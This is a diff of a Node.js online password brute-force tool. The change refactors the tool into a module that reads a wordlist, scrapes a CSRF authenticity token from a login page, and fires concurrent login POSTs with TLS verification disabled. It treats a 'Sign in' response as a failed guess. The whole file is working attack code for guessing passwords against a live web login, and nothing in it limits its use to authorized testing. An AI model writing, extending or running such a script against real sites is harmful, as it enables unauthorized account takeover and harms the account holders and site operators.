@@ -1,13 +1,38 @@
+// Module Dependencies
+var fs      = require('fs');
+var stream  = require('stream');
+var es      = require('event-stream');
+var async   = require('async');
+var request = require('request');
 
-// Set user, filepath, url from CLI args
-var USERNAME    = process.argv[2];
-var FILEPATH    = process.argv[3];
-var BASE_URL    = process.argv[4];
-var CONCURRENCY = process.argv[5];
+function start(config) {
+  var queue = async.queue(tryLogin, config.numRequests);
 
-// Set regexp to define CSRF and login errors
-var CSRF  = /name="authenticity_token" value="(.*)"/;
-var ERROR = /Sign in/ ;
+  queue.drain = function() {
+    console.log('[+] Finished');
+  };
+
+  console.log('[+] Reading wordlist...')
+
+  fs.createReadStream(config.wordlist)
+    .on('error', function() {
+      console.log('[-] Error reading file');
+    })
+    .on('end', function() {
+      console.log('[+] Full wordlist read');
+    })
+    .pipe(es.split())
+    .pipe(es.map(function(word) {
+        queue.push(word);
+      })
+    );
+}
+
+exports.start = start;
+
+// ================================================================================================
+// ================================================================================================
+
 
 // Configure the CSRF token request
 var csrfOptions = {
@@ -18,7 +43,7 @@ var csrfOptions = {
 };
 
 // Define function to extract CSRF token
-var getCSRF = function(callback) {
+function getCSRF(callback) {
   request(csrfOptions, function (error, response, body) {
 
     if (!error && response.statusCode == 200) {
@@ -28,10 +53,10 @@ var getCSRF = function(callback) {
       callback(csrfToken, cookieString);
     }
   });
-};
+}
 
 // Configure the login request
-var loginOptions = function(password, csrfToken, cookieString) {
+function loginOptions(password, csrfToken, cookieString) {
   return {
     url: BASE_URL,
     method: 'POST',
@@ -46,10 +71,10 @@ var loginOptions = function(password, csrfToken, cookieString) {
     },
     rejectUnauthorized: false
   };
-};
+}
 
 // Process login response
-var processLoginResponse = function(response, body, password) {
+function processLoginResponse(response, body, password) {
 
   // If we match known regex password is incorrect
   if (response.statusCode === 200 && body.match(ERROR)) {
@@ -66,10 +91,10 @@ var processLoginResponse = function(response, body, password) {
     console.log('[-] Server responded with: ' + response.statusCode);
   
   }
-};
+}
 
 // Login attempt
-var tryLogin = function(password, callback) {
+function tryLogin(password, callback) {
 
   getCSRF(function(token, cookieString) {
     var opt = loginOptions(password, token, cookieString);
@@ -85,30 +110,3 @@ var tryLogin = function(password, callback) {
     });
   });
 }
-
-// =====================================================================
-//  MAIN ===============================================================
-// =====================================================================
-
-console.log('[+] Starting bruteforce...')
-
-var queue = async.queue(tryLogin, CONCURRENCY);
-
-queue.drain = function() {
-  console.log('[+] Finished');
-};
-
-console.log('[+] Reading wordlist...')
-
-fs.createReadStream(FILEPATH)
-  .on('error', function() {
-    console.log('[-] Error reading file');
-  })
-  .on('end', function() {
-    console.log('[+] Full wordlist read');
-  })
-  .pipe(es.split())
-  .pipe(es.map(function(word) {
-      queue.push(word);
-    })
-  );
